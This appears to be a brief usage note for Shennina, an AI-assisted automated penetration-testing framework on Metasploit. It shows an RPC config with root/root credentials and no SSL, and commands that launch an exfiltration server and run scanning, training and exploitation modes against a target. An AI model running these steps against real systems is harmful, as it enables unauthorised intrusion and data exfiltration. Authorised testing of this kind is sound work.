# Shennina

/config/msfrpg-config.json

{
  "password": "root",
  "user": "root",
  "host": "172.17.0.1",
  "port": 55553,
  "ssl": false
}

## Step 1 Shell 1

# -------runs exfiltration server (separeted console)

cd ./exfiltration-server/

sudo ./run-server.sh

## Step 2 Shell 2

# ------runs msfconsole (separeted console)

./scripts/run-msfrpc.py

## Step 3 Shell 3

# ------runs shennina

./shennina.py --initialize-exploits-tree


#------ scanning phase------#

sudo ./shennina.py --lhost metasploit-ip --target target.local --service-scan-only

# ------------- training shennina ------------------#
sudo ./shennina.py --target 127.0.0.1 --lhost $target_IP --training-mode

# --------------- attacking with recommended exploit given by shennina AI -------------------#
sudo ./shennina.py --target 127.0.0.1 --lhost $target_IP --exploitation-mode



